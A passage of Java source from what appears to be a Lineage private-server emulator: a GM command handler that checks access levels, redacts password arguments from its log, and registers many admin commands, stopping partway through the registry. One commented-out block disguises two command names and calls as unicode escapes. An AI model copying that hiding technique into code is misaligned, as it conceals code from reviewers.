package l1j.server.server;

import l1j.server.server.model.world.CWorldWork;

import l1j.server.server.datatables.CObjectDB;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Timestamp;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Collection;
import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import java.util.Objects;
import java.util.Random;
import java.util.StringTokenizer;
import java.util.logging.Level;
import java.util.logging.Logger;

import javolution.util.FastTable;

import l1j.server.Config;
import l1j.server.DatabaseFactory;
import l1j.server.server.model.character.combat.arena.dogfight.DogFightCommandExecutor;
import l1j.server.server.model.npc.spawn.boss.BossController;
import l1j.server.server.Controller.BugRaceController;
import l1j.server.server.auth.captcha.loader.CaptchaLoadManager;
import l1j.server.server.datatables.AlchemyProbabilityBox;
import l1j.server.server.datatables.AccountSettlementTable;
import l1j.server.server.datatables.AutoLoot;
import l1j.server.server.datatables.CharacterTable;
import l1j.server.server.datatables.ClanTable;
import l1j.server.server.datatables.ExpTable;
import l1j.server.server.model.world.residence.HouseTable;
import l1j.server.server.datatables.IpTable;
import l1j.server.server.datatables.MapsTable;
import l1j.server.server.model.shop.ShopTable;
import l1j.server.server.datatables.CNpcMakerDB;
import l1j.server.server.model.Attendance.AttendanceLoadManager;
import l1j.server.server.model.BookQuest.Loader.BQSLoadManager;
import l1j.server.server.model.Instance.L1DollInstance;
import l1j.server.server.model.Instance.L1ItemInstance;
import l1j.server.server.model.Instance.L1MonsterInstance;
import l1j.server.server.model.Instance.L1NpcInstance;
import l1j.server.server.model.Instance.L1PcInstance;
import l1j.server.server.model.L1Character;
import l1j.server.server.model.L1Clan;
import l1j.server.server.model.rank.L1ClanRanking;
import l1j.server.server.model.inventory.CInventory;
import l1j.server.server.model.L1NeigeSaveChar;
import l1j.server.server.model.L1Object;
import l1j.server.server.model.inventory.L1PolyMorph;
import l1j.server.server.model.CWorld;
import l1j.server.server.model.character.combat.arena.loader.CombatLoadManager;
import l1j.server.server.model.character.combat.statistics.KdaLoadManager;
import l1j.server.server.model.character.combat.statistics.KdaLoader;
import l1j.server.server.model.character.companion.CompanionCommandExecutor;
import l1j.server.server.model.character.skill.L1SkillId;
import l1j.server.server.model.gametime.RealTimeClock;
import l1j.server.server.model.item.L1ItemId;
import l1j.server.server.model.item.collection.loader.CollectionLoadManager;
import l1j.server.server.model.item.enchant.ItemEnchantSystemLoadManager;
import l1j.server.server.model.item.teleport.L1Teleport;
import l1j.server.server.model.network.core.connection.CUserSocket;
import l1j.server.server.model.network.core.cs.packet.CS_CharSelect;
import l1j.server.server.model.network.core.cs.packet.CS_CommonClick;
import l1j.server.server.model.network.core.sc.packet.SC_Ability;
import l1j.server.server.model.network.core.sc.packet.SC_Chainfo;
import l1j.server.server.model.network.core.sc.packet.SC_CharAmount;
import l1j.server.server.model.network.core.sc.packet.SC_CharTitle;
import l1j.server.server.model.network.core.sc.packet.SC_ChatPacket;
import l1j.server.server.model.network.core.sc.packet.SC_Disconnect;
import l1j.server.server.model.network.core.sc.packet.SC_LoginResult;
import l1j.server.server.model.network.core.sc.packet.SC_MarkSee;
import l1j.server.server.model.network.core.sc.packet.SC_OwnCharStatus;
import l1j.server.server.model.network.core.sc.packet.SC_PacketBox;
import l1j.server.server.model.network.core.sc.packet.SC_Restart;
import l1j.server.server.model.network.core.sc.packet.SC_ServerMessage;
import l1j.server.server.model.network.core.sc.packet.SC_ShowHelp;
import l1j.server.server.model.network.core.sc.packet.SC_SkillIconGFX;
import l1j.server.server.model.network.core.sc.packet.SC_SkillSound;
import l1j.server.server.model.network.core.sc.packet.SC_SystemMessage;
import l1j.server.server.model.network.core.sc.packet.SC_Weather;
import l1j.server.server.model.network.safe.CPacketFilter;
import l1j.server.server.model.network.thread.CIOThreadCallback;
import l1j.server.server.model.rank.loader.RankLoadManager;
import l1j.server.server.model.world.instance.dungeon.time.loader.DungeonTimeLoadManager;
import l1j.server.server.model.world.instance.raid.loader.RaidLoadManager;
import l1j.server.server.model.world.siege.CastleWar;
import l1j.server.server.model.world.siege.CastleWarBusiness;
import l1j.server.server.model.world.siege.War;
import l1j.server.server.monitor.LoggerInstance;
import l1j.server.server.packets.Protocol.MainServer.Proto.Proto;
import l1j.server.server.shared.EPcStatus;
import l1j.server.server.shared.command.CommandArgs;
import l1j.server.server.storage.sql.executors.Selector;
import l1j.server.server.storage.sql.executors.Updator;
import l1j.server.server.storage.sql.handler.FullSelectorHandler;
import l1j.server.server.storage.sql.handler.SelectorHandler;
import l1j.server.server.model.world.residence.L1House;
import l1j.server.server.templates.L1Item;
import l1j.server.server.templates.L1Npc;
import l1j.server.server.utils.FullStater;
import l1j.server.server.utils.GameUtils;
import l1j.server.server.utils.IntRange;
import l1j.server.server.utils.L1QueryUtil;
import l1j.server.server.utils.L1SpawnUtil;
import l1j.server.server.utils.SQLUtil;
import l1j.server.server.utils.ServerMessage;
import l1j.server.server.model.character.skill.L1BuffUtil;
import l1j.server.server.model.network.core.sc.packet.SC_WhoAmount;
import l1j.server.server.model.character.skill.L1SkillUse;
import l1j.server.server.model.L1Location;

import l1j.server.server.model.network.core.sc.packet.SC_WorldPutObject;
import l1j.server.server.model.network.core.sc.packet.SC_Invis;
import l1j.server.server.model.Instance.L1ClanJoinInstance;
import l1j.server.server.model.map.L1WorldMap;
import l1j.server.server.model.network.core.sc.packet.SC_RemoveObject;
import l1j.server.server.model.network.core.sc.packet.SC_DoActionGFX;

import l1j.server.server.model.world.trap.L1WorldTraps;
import java.lang.reflect.Constructor;
import l1j.server.server.packets.Protocol.MainServer.Inventory.Proto.SC_WAREHOUSE_ITEM_LIST_NOTI;
import l1j.server.server.model.network.core.sc.packet.SC_MessageYN;

import l1j.server.server.model.L1Question;
import l1j.server.server.templates.L1ItemSetItem;
import l1j.server.server.model.Instance.L1TrapInstance;
import l1j.server.server.datatables.SkillsTable;
import l1j.server.server.model.character.skill.passive.PassiveID;
import l1j.server.server.model.character.skill.passive.PassiveInfo;
import l1j.server.server.model.character.skill.passive.PassiveLoader;
import l1j.server.server.model.character.skill.passive.PassiveUserLoader;
import l1j.server.server.model.network.core.sc.packet.SC_AddSkill;
import l1j.server.server.templates.L1Skills;
import l1j.server.server.datatables.NpcSpawnTable;
import l1j.server.server.model.Instance.L1MerchantInstance;
import l1j.server.server.utils.eKind;
import l1j.server.server.datatables.FurnitureSpawnTable;
import l1j.server.server.datatables.LetterTable;
import l1j.server.server.model.Instance.L1FurnitureInstance;

import java.util.HashMap;
import l1j.server.server.model.CNpcMaker;
import l1j.server.server.shared.ObjectWrapper;
import java.util.NoSuchElementException;

import l1j.server.server.model.inventory.CUserInventory;
import l1j.server.server.model.network.core.sc.packet.SC_Lawful;
import l1j.server.server.model.shop.NpcShopManager;
import l1j.server.server.Controller.HomeTownTimeController;

import l1j.server.server.model.network.core.sc.packet.SC_ShopSellList2;
import l1j.server.server.storage.CacheD;
import gnu.trove.map.TIntObjectMap;
import l1j.server.server.packets.Protocol.MainServer.PlaySupport.PssConfig;
import l1j.server.server.model.character.combat.attack.AttackSkillChanceConfig;
import l1j.server.server.model.character.combat.attack.KeylinkBalanceConfig;
import l1j.server.server.model.character.ItemSkill.Doll.MagicDollCombatConfig;
import l1j.server.server.packets.Protocol.MainServer.PlaySupport.PlaySupport2019;
import l1j.server.server.model.character.combat.arena.dogfight.history.DogFightTicketIdManager;
import l1j.server.server.model.character.animation.NpcSpeedData;
import l1j.server.server.model.character.animation.SprBoundary;
import l1j.server.server.model.character.animation.loader.SpriteInformationLoader;
import l1j.server.server.model.character.action.listener.ActionListenerLinkageLoader;
import l1j.server.server.model.character.action.listener.ActionListenerLoader;
import l1j.server.server.model.item.teleport.designated.DesignatedTeleportLoader;
import l1j.server.server.model.character.effect.action.loader.EffectModelLoader;
import l1j.server.server.model.character.experience.amplifier.ExpAmplifierLoader;
import l1j.server.server.model.character.experience.fishing.FishingExpInfo;
import l1j.server.server.model.item.proc.ItemSkillModelLoader;
import l1j.server.server.model.world.instance.raid.loader.RaidCompensatorLoader;
import l1j.server.server.task.automation.ServerMacroLoader;
import l1j.server.server.task.calendar.MinuteScheduler;
import l1j.server.server.model.item.pride.PrideLoadManager;
import l1j.server.server.datatables.AccessoryEnchantInformationTable;
import l1j.server.server.datatables.AdenShopTable;
import l1j.server.server.datatables.AlchemyProbability;
import l1j.server.server.datatables.ArmorEnchantInformationTable;
import l1j.server.server.datatables.ArmorEnchantList;
import l1j.server.server.datatables.CharactersGiftItemTable;
import l1j.server.server.datatables.CraftProbability;
import l1j.server.server.datatables.DoorSpawnTable;
import l1j.server.server.model.item.drop.DropItemTable;
import l1j.server.server.model.item.drop.DropTable;
import l1j.server.server.datatables.GetBackRestartTable;
import l1j.server.server.datatables.IncreaseEinhasadMap;
import l1j.server.server.datatables.NpcMarkTable;
import l1j.server.server.datatables.MobSkillTable;
import l1j.server.server.datatables.MonsterParalyzeDelay;
import l1j.server.server.model.npc.dialog.NPCTalkDataTable;
import l1j.server.server.datatables.NoDropItem;
import l1j.server.server.datatables.NoShopAndWare;
import l1j.server.server.model.shop.NpcCashShopSpawnTable;
import l1j.server.server.model.npc.chat.NpcChatTable;
import l1j.server.server.datatables.PolyTable;
import l1j.server.server.datatables.ResolventTable;
import l1j.server.server.datatables.UBTable;
import l1j.server.server.datatables.UserProtectMonsterTable;
import l1j.server.server.datatables.WeaponAddDamage;
import l1j.server.server.datatables.WeaponEnchantInformationTable;
import l1j.server.server.datatables.WeaponEnchantList;
import l1j.server.server.datatables.WeaponSkillTable;
import l1j.server.server.model.Beginner;
import l1j.server.server.model.Dungeon;
import l1j.server.server.model.Getback;
import l1j.server.server.model.item.L1TreasureBox;
import l1j.server.server.model.item.function.L1HealingPotion;
import l1j.server.server.packets.Protocol.MainServer.Proto.SC_ALCHEMY_DESIGN_ACK;
import l1j.server.server.packets.Protocol.MainServer.Proto.SC_CRAFT_LIST_ALL_ACK;
import l1j.server.server.packets.Protocol.MainServer.Proto.Craft.CraftLoader;
import l1j.server.server.templates.L1RaceTicket;
import l1j.server.server.model.Instance.L1SummonInstance;
import l1j.server.server.model.CParty;

import l1j.server.server.model.network.core.sc.packet.SC_LetterList;
import l1j.server.server.model.network.core.sc.packet.SC_DoActionShop;
import l1j.server.server.model.network.core.sc.packet.SC_HPMeter;
import gnu.trove.list.array.TLongArrayList;
import l1j.server.server.model.world.announcement.CAnnounceTimer;

public final class BuilderCmdHandler {
 
	private static Logger _log = Logger.getLogger(BuilderCmdHandler.class.getName());

	private static Random _random = new Random(System.nanoTime());
	public List<L1MonsterInstance> fieldbosslist = new ArrayList<L1MonsterInstance>();


	private BuilderCmdHandler() {}

	private static final class Holder {
		private static final BuilderCmdHandler INSTANCE = new BuilderCmdHandler();
	}

	public static BuilderCmdHandler getInstance() {
		return Holder.INSTANCE;
	}

	public static void LoadBuilderCmdHandler() {
		getInstance();
	}

	public boolean Stop = true;


	public void handleCommandsWithoutPermission(L1PcInstance gm, String cmdLine) {
		BuilderCmd2Handler(gm, cmdLine);
	}
	
	
	public void BuilderCmd2Handler(L1PcInstance gm, String cmdLine) {
		if (gm == null || cmdLine == null) return;
		final StringTokenizer tokens = new StringTokenizer(cmdLine);
		if (!tokens.hasMoreTokens()) return;
		final String cmd = tokens.nextToken();
		String param = tokens.hasMoreTokens() ? tokens.nextToken() : "";
		if (tokens.hasMoreTokens()) {
			final StringBuilder args = new StringBuilder(param);
			do {
				args.append(' ').append(tokens.nextToken());
			} while (tokens.hasMoreTokens());
			param = args.toString();
		}

		final BuilderCmdPairType entry = findBuilderCommand(cmd);
		final int access = gm.getAccessLevel();
		if (!hasBuilderPermission(access, entry)) {
			SC_ServerMessage.send(gm, 74, "커맨드 " + cmd);
			return;
		}
		if (entry == null) {
			SC_SystemMessage.send(gm, "[Command] 커멘드 " + cmd + " 는 존재하지 않습니다. ");
			return;
		}

		// Do not put password/account-creation arguments into the command log.
		final String canonical = entry.getName();
		final boolean privateArguments = "암호변경".equals(canonical) || "계정추가".equals(canonical) || "실행".equals(canonical);
		try {
			LoggerInstance.getInstance().addCommand(gm.getName() + ": " + canonical + " "
					+ (privateArguments ? "[REDACTED]" : param));
			entry.execute(gm, canonical, param);
		} catch (RuntimeException failure) {
			// Never run the second handler after an attempted command.
			if (privateArguments) {
				_log.warning("Builder command failed: " + canonical + " / " + failure.getClass().getSimpleName());
			} else {
				_log.log(Level.SEVERE, "Builder command failed: " + canonical, failure);
			}
			SC_SystemMessage.send(gm, "명령어 처리 중 오류가 발생했습니다.");
		}
	}

	private static boolean hasBuilderPermission(int access, BuilderCmdPairType entry) {
		if (access <= 0 || (access != Config.GMCODE && access != Config.SUB_GMCODE)) return false;
		return entry == null || !isFullOnly(entry) || (access == Config.GMCODE && access != Config.SUB_GMCODE);
	}

	private static boolean isFullOnly(BuilderCmdPairType entry) {
		return switch (entry.getName()) {
			case "아이템", "아데나", "선물", "전체선물", "오토선물", "세트아이템", "렙선물",
				"아이템삭제", "인벤삭제", "유저인벤삭제", "디비초기화", "케릭삭제",
				"계정추가", "암호변경", "계정정보", "계정검사", "계정확인", "계정",
				"계정압류", "캐릭압류", "캐릭압류해제", "압류해제", "영구추방", "광역추방",
				"밴아이피", "주변밴", "광역밴", "아이피추방", "무기인챈성공", "방어인챈성공",
				"기운축복", "종료", "검사", "케릭검사", "조회", "셋팅", "스텟", "렙작", "레벨", "캐릭터상태", "서버저장", "리로드", "성혈조작", "아지트지급", "혈맹포인트선물", "혈맹포인트삭제" -> true;
			default -> false;
		};
	}

	@FunctionalInterface
	private interface BuilderCmdFunction {
		void execute(L1PcInstance pc, String command, String arguments);
	}

	private record BuilderCmdPairType(String name, boolean levelRestricted, BuilderCmdFunction function) {
		private BuilderCmdPairType {
			Objects.requireNonNull(name);
			Objects.requireNonNull(function);
		}

		private String getName() {
			return name;
		}

		private boolean isLevelRestricted() {
			return levelRestricted;
		}

		private void execute(L1PcInstance pc, String command, String arguments) {
			function.execute(pc, command, arguments);
		}
	}

	// OFF BuilderCmdHandler: command name -> direct handler, registered once.
	private final Map<String, BuilderCmdPairType> builderCmdMap = createBuilderCmdMap();

	private Map<String, BuilderCmdPairType> createBuilderCmdMap() {
		final Map<String, BuilderCmdPairType> loaded = new LinkedHashMap<>(256);
		registerLevelCommand(loaded, "감시", BuilderCmdHandler::BuilderCmd_patrol);
		registerLevelCommand(loaded, "개인버프", BuilderCmdHandler::BuilderCmd_all_buff);
		registerLevelCommand(loaded, "검사", BuilderCmdHandler::BuilderCmd_check_character);
		registerLevelCommand(loaded, "검색", BuilderCmdHandler::BuilderCmd_search_shop);
		registerLevelCommand(loaded, "계정압류", BuilderCmdHandler::BuilderCmd_account_ban_kick);
		registerLevelCommand(loaded, "계정정보", BuilderCmdHandler::BuilderCmd_check_account);
		registerLevelCommand(loaded, "고스폰", BuilderCmdHandler::BuilderCmd_to_spawn);
		registerLevelCommand(loaded, "공개채금", BuilderCmdHandler::BuilderCmd_public_chat_ban);
		registerLevelCommand(loaded, "광역버프", BuilderCmdHandler::BuilderCmd_range_buff);
		registerLevelCommand(loaded, "광역추방", BuilderCmdHandler::BuilderCmd_range_kick);
		registerLevelCommand(loaded, "귀환", BuilderCmdHandler::BuilderCmd_gm_room);
		registerLevelCommand(loaded, "날씨", BuilderCmdHandler::BuilderCmd_change_weather);
		registerLevelCommand(loaded, "누구", BuilderCmdHandler::BuilderCmd_who);
		registerLevelCommand(loaded, "답장", BuilderCmdHandler::BuilderCmd_letter_reply);
		registerLevelCommand(loaded, "디비초기화", BuilderCmdHandler::BuilderCmd_database_init);
		registerLevelCommand(loaded, "레벨", BuilderCmdHandler::BuilderCmd_level);
		registerLevelCommand(loaded, "렙선물", BuilderCmdHandler::BuilderCmd_level_present);
		registerLevelCommand(loaded, "리로드", BuilderCmdHandler::BuilderCmd_reload_tables);
		registerLevelCommand(loaded, "리로드트랩", BuilderCmdHandler::BuilderCmd_reload_trap);
		registerLevelCommand(loaded, "리셋트랩", BuilderCmdHandler::BuilderCmd_reset_trap);
		registerLevelCommand(loaded, "메세지", BuilderCmdHandler::BuilderCmd_server_message);
		registerLevelCommand(loaded, "몬스터", BuilderCmdHandler::BuilderCmd_spawn_npc);
		registerLevelCommand(loaded, "무인", BuilderCmdHandler::BuilderCmd_fake_character);
		registerLevelCommand(loaded, "배치", BuilderCmdHandler::BuilderCmd_insert_spawn);
		registerLevelCommand(loaded, "밴아이피", BuilderCmdHandler::BuilderCmd_ban_ip);
		registerLevelCommand(loaded, "버프", BuilderCmdHandler::BuilderCmd_buff_by_id);
		registerLevelCommand(loaded, "버프아이콘", BuilderCmdHandler::BuilderCmd_buff_icon);
		registerLevelCommand(loaded, "변신", BuilderCmdHandler::BuilderCmd_poly);
		registerLevelCommand(loaded, "불투명", BuilderCmdHandler::BuilderCmd_visible);
		registerLevelCommand(loaded, "서먼", BuilderCmdHandler::BuilderCmd_summon_servitor);
		registerLevelCommand(loaded, "선물", BuilderCmdHandler::BuilderCmd_give_present);
		registerLevelCommand(loaded, "설문", BuilderCmdHandler::BuilderCmd_gm_question);
		registerLevelCommand(loaded, "세트아이템", BuilderCmdHandler::BuilderCmd_summon_set_item);
		registerLevelCommand(loaded, "셀엔피씨", BuilderCmdHandler::BuilderCmd_impact_npc);
		registerLevelCommand(loaded, "셀이펙트", BuilderCmdHandler::BuilderCmd_impact_effect);
		registerLevelCommand(loaded, "셋팅", BuilderCmdHandler::BuilderCmd_set_status);
		registerLevelCommand(loaded, "소생", BuilderCmdHandler::BuilderCmd_ress);
		registerLevelCommand(loaded, "소환", BuilderCmdHandler::BuilderCmd_recall);
		registerLevelCommand(loaded, "속도", BuilderCmdHandler::BuilderCmd_speed);
		registerLevelCommand(loaded, "쇼트랩", BuilderCmdHandler::BuilderCmd_show_trap);
		registerLevelCommand(loaded, "스레드", BuilderCmdHandler::BuilderCmd_thread);
		registerLevelCommand(loaded, "스킬", BuilderCmdHandler::BuilderCmd_skill_gfx);
		registerLevelCommand(loaded, "스킬마스터", BuilderCmdHandler::BuilderCmd_add_skill);
		registerLevelCommand(loaded, "스킬아이콘", BuilderCmdHandler::BuilderCmd_skill_icon);
		registerLevelCommand(loaded, "스폰이벤트", BuilderCmdHandler::BuilderCmd_event_spawn);
		registerLevelCommand(loaded, "실행", BuilderCmdHandler::BuilderCmd_favorite);
		registerLevelCommand(loaded, "아이템삭제", BuilderCmdHandler::BuilderCmd_delete_items);
		registerLevelCommand(loaded, "아이피추방", BuilderCmdHandler::BuilderCmd_ip_kick);
		registerLevelCommand(loaded, "액션", BuilderCmdHandler::BuilderCmd_action);
		registerLevelCommand(loaded, "에코", BuilderCmdHandler::BuilderCmd_echo);
		registerLevelCommand(loaded, "엔피씨다운", BuilderCmdHandler::BuilderCmd_npc_down);
		registerLevelCommand(loaded, "영구추방", BuilderCmdHandler::BuilderCmd_power_kick);
		registerLevelCommand(loaded, "영자상점1", BuilderCmdHandler::BuilderCmd_npc_shop_switch);
		registerLevelCommand(loaded, "위치", BuilderCmdHandler::BuilderCmd_show_loc);
		registerLevelCommand(loaded, "이동", BuilderCmdHandler::BuilderCmd_move);
		registerLevelCommand(loaded, "이름", BuilderCmdHandler::BuilderCmd_server_name);
		registerLevelCommand(loaded, "이미지", BuilderCmdHandler::BuilderCmd_gfx_id);
		registerLevelCommand(loaded, "이펙트", BuilderCmdHandler::BuilderCmd_skill_effect);
		registerLevelCommand(loaded, "인벤이미지", BuilderCmdHandler::BuilderCmd_inv_gfx_id);
		registerLevelCommand(loaded, "장사", BuilderCmdHandler::BuilderCmd_ad_shop);
		registerLevelCommand(loaded, "정리", BuilderCmdHandler::BuilderCmd_clear);
		registerLevelCommand(loaded, "정보", BuilderCmdHandler::BuilderCmd_describe);
		registerLevelCommand(loaded, "조회", BuilderCmdHandler::BuilderCmd_query_character);
		registerLevelCommand(loaded, "종료", BuilderCmdHandler::BuilderCmd_shutdown_server);
		registerLevelCommand(loaded, "지엠", BuilderCmdHandler::BuilderCmd_toggle_gm);
		registerLevelCommand(loaded, "찾기", BuilderCmdHandler::BuilderCmd_find_object);
		registerLevelCommand(loaded, "채금", BuilderCmdHandler::BuilderCmd_chat_ban);
		registerLevelCommand(loaded, "채팅", BuilderCmdHandler::BuilderCmd_world_chat);
		registerLevelCommand(loaded, "청소", BuilderCmdHandler::BuilderCmd_delete_ground_item);
		registerLevelCommand(loaded, "추방", BuilderCmdHandler::BuilderCmd_kick);
		registerLevelCommand(loaded, "출두", BuilderCmdHandler::BuilderCmd_to_pc);
		registerLevelCommand(loaded, "킬", BuilderCmdHandler::BuilderCmd_kill);
		registerLevelCommand(loaded, "투명", BuilderCmdHandler::BuilderCmd_invisible);
		registerLevelCommand(loaded, "파티소환", BuilderCmdHandler::BuilderCmd_party_recall);
		registerLevelCommand(loaded, "피바", BuilderCmdHandler::BuilderCmd_hp_bar);
		registerLevelCommand(loaded, "홈타운", BuilderCmdHandler::BuilderCmd_home_town);
		registerDirect(loaded, "투견", (gm, cmd, param) -> {
			DogFightCommandExecutor.do_execute(new CommandArgs().setOwner(gm).setParam(param));


		});
		registerDirect(loaded, "펫", (gm, cmd, param) -> {
			CompanionCommandExecutor.exec(new CommandArgs().setOwner(gm).setParam(param));


		});
		registerDirect(loaded, "인형박스", (gm, cmd, param) -> {
			AlchemyProbabilityBox.getInstance().execute(new CommandArgs().setOwner(gm).setParam(param));


		});
		registerDirect(loaded, "혈맹정보", (gm, cmd, param) -> {
			searchclaner(gm, param);


		});
		registerDirect(loaded, "유저도움말", (gm, cmd, param) -> {
			SC_ShowHelp.send(gm, 1);


		});
		registerDirect(loaded, "케릭검사", (gm, cmd, param) -> {
			chainfo(gm, param);

//		case "자동트리":
//			gm.isAutoTreeple = true;
//			break;

		});
		registerDirect(loaded, "케릭삭제", (gm, cmd, param) -> {
			standBy77(gm, param);


		});
		registerDirect(loaded, "기운축복", (gm, cmd, param) -> {
			Blessleaf(gm, param);


		});
		registerDirect(loaded, "무기인챈성공", (gm, cmd, param) -> {
			EnchantWeaponSuccess(gm, param);


		});
		registerDirect(loaded, "방어인챈성공", (gm, cmd, param) -> {
			EnchantArmorSuccess(gm, param);


		});
		registerDirect(loaded, "계정검사", (gm, cmd, param) -> {
			AccountCheck(gm, param);


		});
		registerDirect(loaded, "계정확인", (gm, cmd, param) -> {
			AccountCheck1(gm, param);


		});
		registerDirect(loaded, "보스", (gm, cmd, param) -> {
			addEventBoss(gm, param);


		});
		registerDirect(loaded, "혈맹포인트", (gm, cmd, param) -> {
			혈맹포인트(gm);


		});
		registerDirect(loaded, "던전타이머", (gm, cmd, param) -> {
			DungeonTimeLoadManager.getInstance().execute(new CommandArgs().setOwner(gm).setParam(param));


		});
		registerDirect(loaded, "저주", (gm, cmd, param) -> {
			CurseCharacter(new CommandArgs().setOwner(gm).setParam(param));


		});
		registerDirect(loaded, "저주초기화", (gm, cmd, param) -> {
			CurseInitializeCharacter(new CommandArgs().setOwner(gm).setParam(param));


		});
		registerDirect(loaded, "인챈트시스템", (gm, cmd, param) -> {
			ItemEnchantSystemLoadManager.getInstance().execute(new CommandArgs().setOwner(gm).setParam(param));


		});
		registerDirect(loaded, "캡챠", (gm, cmd, param) -> {
			CaptchaLoadManager.getInstance().execute(new CommandArgs().setOwner(gm).setParam(param));


		});
		registerDirect(loaded, "캐릭터상태", (gm, cmd, param) -> {
			setCharacterInstanceStatus(new CommandArgs().setOwner(gm).setParam(param));


		});
		registerDirect(loaded, "배틀시스템", (gm, cmd, param) -> {
			CombatLoadManager.getInstance().execute(new CommandArgs().setOwner(gm).setParam(param));


		});
		registerDirect(loaded, "북시스템", (gm, cmd, param) -> {
			BQSLoadManager.getInstance().execute(new CommandArgs().setOwner(gm).setParam(param));


		});
		registerDirect(loaded, "출석체크", (gm, cmd, param) -> {
			AttendanceLoadManager.getInstance().execute(new CommandArgs().setOwner(gm).setParam(param));


		});
		registerDirect(loaded, "강제리스", (gm, cmd, param) -> {
			강제리스(gm, param);


		});
		registerDirect(loaded, "표기셋팅", (gm, cmd, param) -> {
			setPresentationCode(gm, param);


		});
		registerDirect(loaded, "마법회피율", (gm, cmd, param) -> {
			findMagicDodge(gm, param);


		});
		registerDirect(loaded, "오브젝트리스트", (gm, cmd, param) -> {
			showObjectList(gm, param);


		});
		registerDirect(loaded, "오토선물", (gm, cmd, param) -> autoAllPresent(gm, param));
		registerDirect(loaded, "보호모드", (gm, cmd, param) -> {
			setProtectionMode(gm, param);


		});
		registerDirect(loaded, "전체채팅", (gm, cmd, param) -> {
			전체채팅(gm, param);


		});
		registerDirect(loaded, "채팅차단", (gm, cmd, param) -> {
			일반채팅(gm, param);


		});
		registerDirect(loaded, "넷세이프", (gm, cmd, param) -> {
			CPacketFilter.commands(gm, param);


		});
		registerDirect(loaded, "킬차트", (gm, cmd, param) -> {
			KdaLoadManager.commands(gm, param);


		});
		registerDirect(loaded, "워리스트", (gm, cmd, param) -> {
			showWarList(gm);


		});
		registerDirect(loaded, "캐릭압류", (gm, cmd, param) -> {
			setCharBlock(gm, param);


		});
		registerDirect(loaded, "캐릭압류해제", (gm, cmd, param) -> {
			setCharBlockDelete(gm, param);


		});
		registerDirect(loaded, "/", (gm, cmd, param) -> {
			showNextEffect(gm);


		});
		registerDirect(loaded, "이펙", (gm, cmd, param) -> {
			showEffectInit(gm, param);


		});
		registerDirect(loaded, "혈마크", (gm, cmd, param) -> {
			clanMark(gm, param);


		});
		registerDirect(loaded, "레이드", (gm, cmd, param) -> {
			RaidLoadManager.commands(gm, param);


		});
		registerDirect(loaded, "구슬", (gm, cmd, param) -> {
			CollectionLoadManager.commands(gm, param);


		});
		registerDirect(loaded, "구슬조회", (gm, cmd, param) -> {
			L1NeigeSaveChar.commands(gm, param);


		});
		registerDirect(loaded, "가라", (gm, cmd, param) -> {
			nocall(gm, param);


		});
		registerDirect(loaded, "랭킹시스템", (gm, cmd, param) -> {
			RankLoadManager.getInstance().execute(new CommandArgs().setOwner(gm).setParam(param));


		});
		registerDirect(loaded, "혈맹랭킹갱신", (gm, cmd, param) -> {
			L1ClanRanking.getInstance().gmcommand();
			gm.sendPackets("\\aA■ 혈맹레이드 랭킹이 갱신 되었습니다 ■");


		});
		registerDirect(loaded, "아이템", (gm, cmd, param) -> execute(gm, cmd, param));
		registerDirect(loaded, "아데나", (gm, cmd, param) -> {
			execute1(gm, param, param);


		});
		registerDirect(loaded, "이벤트", (gm, cmd, param) -> {
			Event(gm, param);


		});
		registerDirect(loaded, "이벤트상점", (gm, cmd, param) -> {
			BossController.handleShopAlarmCommand(gm, param);

//		case "테스팅":
//			gm.sendPackets(new RActionUI(RActionUI.EVENT_SYSTEM, 45752, true));
//			break;

		});
		registerDirect(loaded, "잠재력조회", (gm, cmd, param) -> {
			아아(gm, param);


		});
		registerDirect(loaded, "주변밴", (gm, cmd, param) -> {
			LargeAreaBan(gm, param);


		});
		registerDirect(loaded, "광역밴", (gm, cmd, param) -> {
			LargeAreaIPBan(gm, param);


		});
		registerDirect(loaded, "아지트지급", (gm, cmd, param) -> {
			GiveHouse(gm, param);


		});
		registerDirect(loaded, "공성시작", (gm, cmd, param) -> {
			castleWarStart(gm, param);

//		case "수배테스트":
//			hunt(gm, param);
//			break;
//		case "vip":
//			vipsetting(gm, param);
//			break;

		});
		registerDirect(loaded, "공성종료", (gm, cmd, param) -> {
			castleWarExit(gm, param);

//		case "메세지테스트":
//			gm.sendPackets(new S_TestPacket(S_TestPacket.a));
//			gm.sendPackets(new S_UserCommands20(1, gm));
//			break;

		});
		registerDirect(loaded, "서버저장", (gm, cmd, param) -> {
			serversave(gm);


		});
		registerDirect(loaded, "전체선물", (gm, cmd, param) -> {
			allpresent(gm, param);


		});
		registerDirect(loaded, "압류해제", (gm, cmd, param) -> {
			accountdel(gm, param);


		});
		registerDirect(loaded, "경험치복구", (gm, cmd, param) -> {
			returnEXP(gm, param);


		});
		registerDirect(loaded, "오토루팅", (gm, cmd, param) -> {
			autoloot(gm, param);


		});
		registerDirect(loaded, "페널티", (gm, cmd, param) -> {
			ExpTable.expPenaltyReLoad();
			gm.sendPackets("■ 페널티 리로드 완료 ■");


		});
		registerDirect(loaded, "잠재력", (gm, cmd, param) -> {
			잠재력활성화(gm, param);


		});
		registerDirect(loaded, "밸런스", (gm, cmd, param) -> {
			CharacterBalance(gm, param);


		});
		registerDirect(loaded, "라이트", (gm, cmd, param) -> {
			maphack(gm, param);


		});
		registerDirect(loaded, "오픈대기", (gm, cmd, param) -> {
			standBy(gm, param);


		});
		registerDirect(loaded, "스텟", (gm, cmd, param) -> {
			fullstat(gm, param);


		});
		registerDirect(loaded, "상점검사", (gm, cmd, param) -> {
			상점검사(gm);


		});
		registerDirect(loaded, "이팩트", (gm, cmd, param) -> {
			effect(gm, param);


		});
		registerDirect(loaded, "유저인벤삭제", (gm, cmd, param) -> {
			targetInventoryDelete(gm, param);


		});
		registerDirect(loaded, "계정추가", (gm, cmd, param) -> {
			addaccount(gm, param);

//		case "\uB9E4\uC785\uC800\uC7A5":
//			addaccount1\u0028\u0067\u006D\u002C\u0070\u0061\u0072\u0061\u006D\u0029\u003B
//			break;
//		case "\uB9E4\uC785\uC9C0\uAE09":
//			\u006D\u0065\u0065\u0070\u0035\u0035\u0028\u0067\u006D\u002C\u0070\u0061\u0072\u0061\u006D\u0029\u003B
//			break;

		});
		registerDirect(loaded, "전체소환", (gm, cmd, param) -> {
			allrecall(gm);


		});
		registerDirect(loaded, "맵인원", (gm, cmd, param) -> {
			mapwho(gm, param);


		});
